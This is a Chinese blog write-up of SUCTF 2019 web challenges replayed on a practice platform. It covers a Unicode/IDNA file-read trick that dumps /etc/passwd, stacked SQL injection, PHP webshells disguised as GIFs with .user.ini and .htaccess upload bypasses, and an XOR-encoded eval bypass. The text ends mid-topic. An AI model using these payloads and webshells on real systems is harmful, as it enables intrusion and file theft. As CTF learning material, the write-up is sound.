---
title: buuoj刷题记录11-SUCTF复现
date: 2020-02-04 23:46:53
tags:
 - buuoj
 - web
 - suctf2019
---

## Pythonginx

- 2019 usa black hat一个议题  [会议pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)

  ![](/pic/67)

- 关于[idna编码](https://datatracker.ietf.org/doc/rfc5891/)   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u

- CVE-2019-9636  : urlsplit不处理NFKC标准化   

<!--more-->

题目给了源码

```
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname   #返回netloc部分
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

*parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：`scheme://netloc/path;parameters?query#fragment`*

大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码

题目标题是pythonginx，提示nginx，nginx文件路径如下

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
网站配置文件：/usr/local/nginx/conf/nginx.conf
```



**非预期解**

以下是urlsplit函数源码

```python
def urlunsplit(components):
    scheme, netloc, url, query, fragment, _coerce_result = (
                                          _coerce_args(*components))
    if netloc or (scheme and scheme in uses_netloc and url[:2] != '//'):
        if url and url[:1] != '/': url = '/' + url
        url = '//' + (netloc or '') + url
    if scheme:
        url = scheme + ':' + url
    if query:
        url = url + '?' + query
    if fragment:
        url = url + '#' + fragment
    return _coerce_result(url)
```

这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。

也就是`scheme:////netloc/path;parameters?query#fragment`经过urlsplite处理后会变成

```
scheme='scheme', netloc='', path='//netloc/path;parameters', query='query', fragment='fragment'
```

再经过urlunsplit处理后会变成

```
scheme://netloc/path;parameters?query#fragment
```

如果传入的url是

```
file:////suctf.cc/etc/passwd
```

会返回主机的用户记录

```
root:*:17647:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
nginx:!:17708:0:99999:7:::
```

查看配置文件

```
getUrl?url=file:////suctf.cc/etc/nginx/nginx.conf
```

![](/pic/66)

查看网站配置文件

```
getUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf
```

```
server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /app/static;
    }
    # location /flag {
    #     alias /usr/fffffflag;
    # }
}
```

提示flag再 /usr/fffffflag 中

```
getUrl?url=file:////suctf.cc/usr/fffffflag
```

```
flag{b692ca82-8292-4582-846a-286b3743f697}
```



**预期解**
black hat 上的所展示的部分字符
![](/pic/69.png)

Altman师傅写的脚本

```
# coding:utf-8 
for i in range(128,65537):    
    tmp=chr(i)    
    try:        
        res = tmp.encode('idna').decode('utf-8')        
        if("-") in res:            
            continue        
        print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))    
    except:        
        pass
```


可以使用**U+2102，ℂ**代替c，或者**U+2106, ℆**代替c/u


读取网站配置文件

```
getUrl?url=file:////suctf.ℂℂ/usr/local/nginx/conf/nginx.conf
或者
getUrl?url=file:////suctf.c℆usr/local/nginx/conf/nginx.conf
```

读取flag

```
/getUrl?url=file://suctf.cℂ/usr/fffffflag
或者
getUrl?url=file:////suctf.c℆usr/fffffflag
```



## EasySQL

拿到题目是一个输入框，post类型提交

先fuzz一遍，以下关键字被过滤

![](/pic/68.png)

**非预期解**

```
*,1
```

```
Array ( [0] => flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} [1] => 1 )
```



**预期解**

根据测试发现输入长度最大为40个字符

还发现存在堆叠注入

```
1;show databases;#
 
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

经过测试查询语句应该类似于

```
select $_POST['query'] || flag ...
```

关于[sql_mod](https://mariadb.com/kb/en/sql-mode/)

当设置sql_mode=**PIPES_AS_CONCAT**时，将"||"视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似

所以payload为：

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

返结果为：

```
Array ( [0] => 1 ) Array ( [0] => 1flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} )
```



## Upload Labs

发现是文件上传服务器是openresty，不能采用上传.htaccess的方式

```
HTTP/1.1 200 OK

Server: openresty

Date: Fri, 07 Feb 2020 08:24:01 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 768
Connection: close
```



先直接上传图片马，提示文件内容包含`<?`，采用js的写法绕过

```
<script language="php"> 
eval($_POST[cmd]);
</script>
```

改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤

php有一个文件是[.user.ini](https://www.php.net/manual/zh/configuration.file.per-user.php)    [参考连接]([https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html))

![](/pic/70)

先上传一个图片马

```
Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
Content-Type: image/gif

GIF89a
<script language="php"> 
eval($_POST[cmd]);
</script>
```

然后上传.user.ini

```
Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
Content-Type: image/gif

GIF89a
auto_prepend_file=1.gif
```

auto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif

返回信息

```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Upload Labs</title>
</head>

<body>
    <h2>Upload Labs</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="file">文件名：</label>
        <input type="file" name="fileUpload" id="file"><br>
        <input type="submit" name="upload" value="提交">
    </form>
</body>

</html>

Your dir uploads/2c67ca1eaeadbdc1868d67003072b481 <br>Your files : <br>array(5) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) ".user.ini"
  [3]=>
  string(5) "1.gif"
  [4]=>
  string(9) "index.php"
}
```

使用蚁剑连接`host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php`即可

![](/pic/71.png)



## EasyWeb

打开题目就是源码

```
<?php
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh){
    highlight_file(__FILE__);
}

if(strlen($hhh)>18){
    die('One inch long, one inch strong!');
}

if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if(strlen($character_type)>12) die("Almost there!");

eval($hhh);
?>
```

首先要绕过长度，然后是绕过正则。

绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）

异或构造$_GET['\_']

```
echo urlencode(urldecode("%ff%ff%ff%ff")^"_GET"); //%A0%B8%BA%AB
```

payload：

```
?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=phpinfo
```

查看phpinfo禁用了如下函数

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail
```

还设置了`open_basedir`

```
open_basedir	/var/www/html/:/tmp/
```



```
function get_the_flag(){
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
    if(!file_exists($userdir)){
    mkdir($userdir);
    }
    if(!empty($_FILES["file"])){
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name,".")+1);
    if(preg_match("/ph/i",$extension)) die("^_^"); 
        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
    if(!exif_imagetype($tmp_name)) die("^_^"); 
        $path= $userdir."/".$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}
```

strrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置

mb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置

此函数大致意思是文件内容不能包含<?，上传的文件要经过exif_imagetype（）检测



使用payload上传文件

```
?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=get_the_flag
```

.htaccess

```
#define height 12
#define width 12
AddType application/x-httpd-php .cc
php_value auto_append_file "php://filter/convert.base64-decode/resource=1.cc"
```

1.cc

```
GIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==
```

GIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过<?



绕过`open_basedir`

